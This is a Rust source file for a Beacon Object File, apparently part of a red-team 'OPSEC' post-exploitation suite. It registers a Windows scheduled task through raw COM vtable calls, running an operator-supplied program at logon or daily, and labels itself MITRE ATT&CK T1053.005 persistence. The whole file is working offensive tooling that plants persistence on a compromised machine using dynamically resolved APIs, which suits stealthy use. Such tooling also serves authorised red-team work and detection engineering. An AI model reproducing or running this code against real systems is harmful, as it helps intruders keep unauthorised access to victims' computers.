// SPDX-FileCopyrightText: 2026 Dani <daniagungg@gmail.com>
// SPDX-License-Identifier: MIT
// Project: DEF-Situational-Awareness-BOF — Dani RustBOF OPSEC Suite
// Credit: Rust port + OPSEC hardening — by Dani
//
//! Create a scheduled task via ITaskService COM vtable.
//!
//! Follows the schtasksenum COM vtable pattern — no IDispatch, pure vtable calls.
//!
//! ITaskService vtable:
//!   [0] QueryInterface, [1] AddRef, [2] Release,
//!   [3] Connect, [4] GetFolder, [5] GetRunningTasks, [6] NewTask
//!
//! ITaskFolder vtable:
//!   [0] QueryInterface, [1] AddRef, [2] Release,
//!   [3] get_Name, [4] get_Path, [5] GetFolder, [6] GetFolders,
//!   [7] GetTask, [8] GetTasks, [9] GetNumberOfMissedRuns,
//!   [10] get_SecurityDescriptor, [11] put_SecurityDescriptor,
//!   [12] DeleteFolder, [13] DeleteTask, [14] RegisterTask,
//!   [15] RegisterTaskDefinition, [16] CreateFolderAsAdmin
//!   NOTE: RegisterTaskDefinition is at vtable index 15.
//!
//! ITaskDefinition vtable:
//!   [0-2] IUnknown, [3] get_RegistrationInfo,
//!   [4] put_RegistrationInfo, [5] get_Triggers, [6] put_Triggers,
//!   [7] get_Settings, [8] put_Settings, [9] get_Data, [10] put_Data,
//!   [11] get_Principal, [12] put_Principal, [13] get_Actions, [14] put_Actions,
//!   [15] get_XmlText, [16] put_XmlText
//!
//! IActionCollection vtable:
//!   [0-2] IUnknown, [3] get_Count, [4] get_Item, [5] get__NewEnum,
//!   [6] get_XmlText, [7] put_XmlText, [8] Create, [9] Remove, [10] Clear
//!
//! IExecAction vtable:
//!   [0-2] IUnknown, [3] get_Id, [4] put_Id, [5] get_Type,
//!   [6] get_Path, [7] put_Path, [8] get_Arguments, [9] put_Arguments,
//!   [10] get_WorkingDirectory, [11] put_WorkingDirectory
//!
//! ITriggerCollection vtable:
//!   [0-2] IUnknown, [3] get_Count, [4] get_Item, [5] get__NewEnum,
//!   [6] get_XmlText, [7] put_XmlText, [8] Create, [9] Remove, [10] Clear
//!
//! Args: <taskname> <program> <arguments> <trigger: onlogon|daily>
//!
//! MITRE ATT&CK: T1053.005 (Scheduled Task/Job: Scheduled Task)
#![no_std]
#![cfg_attr(not(test), no_main)]

use rustbof::{println, eprintln};
use alloc::string::String;
use common::{mitre::Technique, dfr_fn};

const TECHNIQUES: &[Technique] = &[
    Technique {
        id: "T1053.005",
        name: "Scheduled Task/Job: Scheduled Task",
        tactic: "Persistence",
    },
];

// CLSID_TaskScheduler = {0f87369f-a4e5-11d1-9781-00600824309d}
const CLSID_TASK_SCHEDULER: [u8; 16] = [
    0x9f, 0x36, 0x87, 0x0f, 0xe5, 0xa4, 0xd1, 0x11,
    0x97, 0x81, 0x00, 0x60, 0x08, 0x24, 0x30, 0x9d,
];
// IID_ITaskService = {2faba4c7-4da9-4013-9697-20cc3fd40f85}
const IID_ITASK_SERVICE: [u8; 16] = [
    0xc7, 0xa4, 0xab, 0x2f, 0xa9, 0x4d, 0x13, 0x40,
    0x96, 0x97, 0x20, 0xcc, 0x3f, 0xd4, 0x0f, 0x85,
];

const CLSCTX_INPROC_SERVER:  u32 = 1;
const COINIT_MULTITHREADED:  u32 = 0;
const S_OK: i32 = 0;
// TASK_TRIGGER_LOGON = 9, TASK_TRIGGER_DAILY = 2
const TASK_TRIGGER_LOGON: i32 = 9;
const TASK_TRIGGER_DAILY: i32 = 2;
// TASK_ACTION_EXEC = 0
const TASK_ACTION_EXEC: i32 = 0;
// TASK_CREATE_OR_UPDATE = 6
const TASK_CREATE_OR_UPDATE: i32 = 6;
// TASK_LOGON_INTERACTIVE_TOKEN = 3
const TASK_LOGON_INTERACTIVE_TOKEN: i32 = 3;

#[repr(C)]
#[derive(Clone, Copy)]
struct Variant {
    vt: u16, r1: u16, r2: u16, r3: u16,
    val: u64, _pad: u64,
}
impl Variant {
    fn empty() -> Self { Self { vt: 0, r1: 0, r2: 0, r3: 0, val: 0, _pad: 0 } }
    fn bstr(bstr_ptr: *mut u16) -> Self {
        let mut s = Self::empty();
        s.vt = 8; // VT_BSTR
        s.val = bstr_ptr as u64;
        s
    }
    fn i4(v: i32) -> Self {
        let mut s = Self::empty(); s.vt = 3; s.val = v as u64; s
    }
}

dfr_fn!(
    co_initialize_ex(reserved: *mut core::ffi::c_void, co_init: u32) -> i32,
    module = "ole32.dll",
    api    = "CoInitializeEx"
);
dfr_fn!(
    co_create_instance(
        rclsid: *const u8, unk_outer: *mut core::ffi::c_void,
        cls_context: u32, riid: *const u8,
        ppv: *mut *mut core::ffi::c_void,
    ) -> i32,
    module = "ole32.dll",
    api    = "CoCreateInstance"
);
dfr_fn!(
    co_uninitialize() -> (),
    module = "ole32.dll",
    api    = "CoUninitialize"
);
dfr_fn!(
    sys_alloc_string(s: *const u16) -> *mut u16,
    module = "oleaut32.dll",
    api    = "SysAllocString"
);
dfr_fn!(
    sys_free_string(bstr: *mut u16) -> (),
    module = "oleaut32.dll",
    api    = "SysFreeString"
);

const ROOT_W: &[u16] = &[b'\\' as u16, 0];

unsafe fn release_com(vtbl: *mut usize, ptr: *mut core::ffi::c_void) {
    let release: unsafe extern "system" fn(*mut core::ffi::c_void) -> u32 =
        core::mem::transmute(*vtbl.add(2));
    release(ptr);
}

/// Build a BSTR from an ASCII string slice using SysAllocString.
unsafe fn make_bstr(ascii: &str) -> Result<*mut u16, &'static str> {
    let mut wide_buf = [0u16; 512];
    common::str_util::ascii_to_wide_buf(ascii.as_bytes(), &mut wide_buf);
    sys_alloc_string(wide_buf.as_ptr()).map_err(|_| "bstr alloc")
}

#[rustbof::main]
fn main(args: *mut u8, len: usize) {
    common::mitre::print_banner(env!("CARGO_PKG_NAME"), TECHNIQUES);
    let mut parser = rustbof::data::DataParser::new(args, len);
    match run(&mut parser) {
        Ok(()) => {},
        Err(e) => eprintln!("[!] {}: {}", env!("CARGO_PKG_NAME"), e),
    }
}

fn run(parser: &mut rustbof::data::DataParser) -> Result<(), &'static str> {
    let taskname  = String::from(parser.get_str());
    let program   = String::from(parser.get_str());
    let arguments = String::from(parser.get_str());
    let trigger   = String::from(parser.get_str());

    if taskname.is_empty() || program.is_empty() {
        return Err("usage: add-task-scheduler <taskname> <program> <args> <onlogon|daily>");
    }

    let trigger_type = if trigger.eq_ignore_ascii_case("daily") {
        TASK_TRIGGER_DAILY
    } else {
        TASK_TRIGGER_LOGON
    };

    unsafe { co_initialize_ex(core::ptr::null_mut(), COINIT_MULTITHREADED) }
        .map_err(|_| "com init")?;

    let mut svc: *mut core::ffi::c_void = core::ptr::null_mut();
    let hr = unsafe {
        co_create_instance(
            CLSID_TASK_SCHEDULER.as_ptr(),
            core::ptr::null_mut(),
            CLSCTX_INPROC_SERVER,
            IID_ITASK_SERVICE.as_ptr(),
            &mut svc,
        )
    }.map_err(|_| "create instance")?;

    if hr != S_OK || svc.is_null() {
        unsafe { let _ = co_uninitialize(); };
        return Err("task svc create failed");
    }

    let svc_vtbl = unsafe { *(svc as *mut *mut usize) };

    // Connect(Empty, Empty, Empty, Empty) — vtable index 3
    let connect_fn: unsafe extern "system" fn(
        *mut core::ffi::c_void, Variant, Variant, Variant, Variant,
    ) -> i32 = unsafe { core::mem::transmute(*svc_vtbl.add(3)) };

    let hr2 = unsafe {
        connect_fn(svc, Variant::empty(), Variant::empty(), Variant::empty(), Variant::empty())
    };
    if hr2 != S_OK {
        unsafe { release_com(svc_vtbl, svc); let _ = co_uninitialize(); };
        return Err("connect failed");
    }

    // NewTask(0, &pTaskDef) — vtable index 6
    let new_task_fn: unsafe extern "system" fn(
        *mut core::ffi::c_void, u32, *mut *mut core::ffi::c_void,
    ) -> i32 = unsafe { core::mem::transmute(*svc_vtbl.add(6)) };

    let mut task_def: *mut core::ffi::c_void = core::ptr::null_mut();
    let hr3 = unsafe { new_task_fn(svc, 0, &mut task_def) };
    if hr3 != S_OK || task_def.is_null() {
        unsafe { release_com(svc_vtbl, svc); let _ = co_uninitialize(); };
        return Err("new task failed");
    }
    let taskdef_vtbl = unsafe { *(task_def as *mut *mut usize) };

    // ITaskDefinition: get_Triggers() at vtable index 5
    let get_triggers_fn: unsafe extern "system" fn(
        *mut core::ffi::c_void, *mut *mut core::ffi::c_void,
    ) -> i32 = unsafe { core::mem::transmute(*taskdef_vtbl.add(5)) };

    let mut triggers: *mut core::ffi::c_void = core::ptr::null_mut();
    let hr_trig = unsafe { get_triggers_fn(task_def, &mut triggers) };
    if hr_trig != S_OK || triggers.is_null() {
        unsafe {
            release_com(taskdef_vtbl, task_def);
            release_com(svc_vtbl, svc);
            let _ = co_uninitialize();
        };
        return Err("get triggers failed");
    }
    let trig_vtbl = unsafe { *(triggers as *mut *mut usize) };

    // ITriggerCollection::Create(type, &pTrigger) at vtable index 8
    let create_trig_fn: unsafe extern "system" fn(
        *mut core::ffi::c_void, i32, *mut *mut core::ffi::c_void,
    ) -> i32 = unsafe { core::mem::transmute(*trig_vtbl.add(8)) };

    let mut trigger_obj: *mut core::ffi::c_void = core::ptr::null_mut();
    let hr_ct = unsafe { create_trig_fn(triggers, trigger_type, &mut trigger_obj) };
    unsafe { release_com(trig_vtbl, triggers); };

    if hr_ct != S_OK || trigger_obj.is_null() {
        unsafe {
            release_com(taskdef_vtbl, task_def);
            release_com(svc_vtbl, svc);
            let _ = co_uninitialize();
        };
        return Err("create trigger failed");
    }
    let _trig_obj_vtbl = unsafe { *(trigger_obj as *mut *mut usize) };
    unsafe { release_com(_trig_obj_vtbl, trigger_obj); };

    // ITaskDefinition: get_Actions() at vtable index 13
    let get_actions_fn: unsafe extern "system" fn(
        *mut core::ffi::c_void, *mut *mut core::ffi::c_void,
    ) -> i32 = unsafe { core::mem::transmute(*taskdef_vtbl.add(13)) };

    let mut actions: *mut core::ffi::c_void = core::ptr::null_mut();
    let hr_act = unsafe { get_actions_fn(task_def, &mut actions) };
    if hr_act != S_OK || actions.is_null() {
        unsafe {
            release_com(taskdef_vtbl, task_def);
            release_com(svc_vtbl, svc);
            let _ = co_uninitialize();
        };
        return Err("get actions failed");
    }
    let actions_vtbl = unsafe { *(actions as *mut *mut usize) };

    // IActionCollection::Create(TASK_ACTION_EXEC, &pAction) at vtable index 8
    let create_action_fn: unsafe extern "system" fn(
        *mut core::ffi::c_void, i32, *mut *mut core::ffi::c_void,
    ) -> i32 = unsafe { core::mem::transmute(*actions_vtbl.add(8)) };

    let mut action_obj: *mut core::ffi::c_void = core::ptr::null_mut();
    let hr_ca = unsafe { create_action_fn(actions, TASK_ACTION_EXEC, &mut action_obj) };
    unsafe { release_com(actions_vtbl, actions); };

    if hr_ca != S_OK || action_obj.is_null() {
        unsafe {
            release_com(taskdef_vtbl, task_def);
            release_com(svc_vtbl, svc);
            let _ = co_uninitialize();
        };
        return Err("create action failed");
    }
    let action_vtbl = unsafe { *(action_obj as *mut *mut usize) };

    // IExecAction::put_Path at vtable index 7
    let put_path_fn: unsafe extern "system" fn(
        *mut core::ffi::c_void, *mut u16,
    ) -> i32 = unsafe { core::mem::transmute(*action_vtbl.add(7)) };

    let prog_bstr = unsafe { make_bstr(program.as_str()) }.map_err(|e| {
        unsafe {
            release_com(action_vtbl, action_obj);
            release_com(taskdef_vtbl, task_def);
            release_com(svc_vtbl, svc);
            let _ = co_uninitialize();
        };
        e
    })?;
    unsafe { put_path_fn(action_obj, prog_bstr) };
    unsafe { let _ = sys_free_string(prog_bstr); };

    // IExecAction::put_Arguments at vtable index 9
    if !arguments.is_empty() {
        let put_args_fn: unsafe extern "system" fn(
            *mut core::ffi::c_void, *mut u16,
        ) -> i32 = unsafe { core::mem::transmute(*action_vtbl.add(9)) };

        if let Ok(args_bstr) = unsafe { make_bstr(arguments.as_str()) } {
            unsafe { put_args_fn(action_obj, args_bstr) };
            unsafe { let _ = sys_free_string(args_bstr); };
        }
    }

    unsafe { release_com(action_vtbl, action_obj); };

    // GetFolder("\") — vtable index 4
    let get_folder_fn: unsafe extern "system" fn(
        *mut core::ffi::c_void, *mut u16, *mut *mut core::ffi::c_void,
    ) -> i32 = unsafe { core::mem::transmute(*svc_vtbl.add(4)) };

    let root_bstr = unsafe { sys_alloc_string(ROOT_W.as_ptr()) }
        .map_err(|_| "bstr alloc")?;
    let mut folder: *mut core::ffi::c_void = core::ptr::null_mut();
    let hr_gf = unsafe { get_folder_fn(svc, root_bstr, &mut folder) };
    unsafe { let _ = sys_free_string(root_bstr); };

    if hr_gf != S_OK || folder.is_null() {
        unsafe {
            release_com(taskdef_vtbl, task_def);
            release_com(svc_vtbl, svc);
            let _ = co_uninitialize();
        };
        return Err("get folder failed");
    }
    let folder_vtbl = unsafe { *(folder as *mut *mut usize) };

    // ITaskFolder::RegisterTaskDefinition at vtable index 15
    let reg_task_def_fn: unsafe extern "system" fn(
        *mut core::ffi::c_void,
        *mut u16,   // name BSTR
        *mut core::ffi::c_void, // pDefinition
        i32,        // flags
        Variant,    // userId
        Variant,    // password
        i32,        // logonType
        Variant,    // sddl
        *mut *mut core::ffi::c_void, // ppTask out
    ) -> i32 = unsafe { core::mem::transmute(*folder_vtbl.add(15)) };

    let name_bstr = unsafe { make_bstr(taskname.as_str()) }.map_err(|e| {
        unsafe {
            release_com(folder_vtbl, folder);
            release_com(taskdef_vtbl, task_def);
            release_com(svc_vtbl, svc);
            let _ = co_uninitialize();
        };
        e
    })?;

    let mut out_task: *mut core::ffi::c_void = core::ptr::null_mut();
    let hr_reg = unsafe {
        reg_task_def_fn(
            folder,
            name_bstr,
            task_def,
            TASK_CREATE_OR_UPDATE,
            Variant::empty(),
            Variant::empty(),
            TASK_LOGON_INTERACTIVE_TOKEN,
            Variant::empty(),
            &mut out_task,
        )
    };
    unsafe { let _ = sys_free_string(name_bstr); };

    if !out_task.is_null() {
        let ot_vtbl = unsafe { *(out_task as *mut *mut usize) };
        unsafe { release_com(ot_vtbl, out_task); };
    }

    unsafe {
        release_com(folder_vtbl, folder);
        release_com(taskdef_vtbl, task_def);
        release_com(svc_vtbl, svc);
        let _ = co_uninitialize();
    };

    if hr_reg != S_OK {
        return Err("task registration failed");
    }

    println!("[+] scheduled task created: {}", taskname);
    Ok(())
}
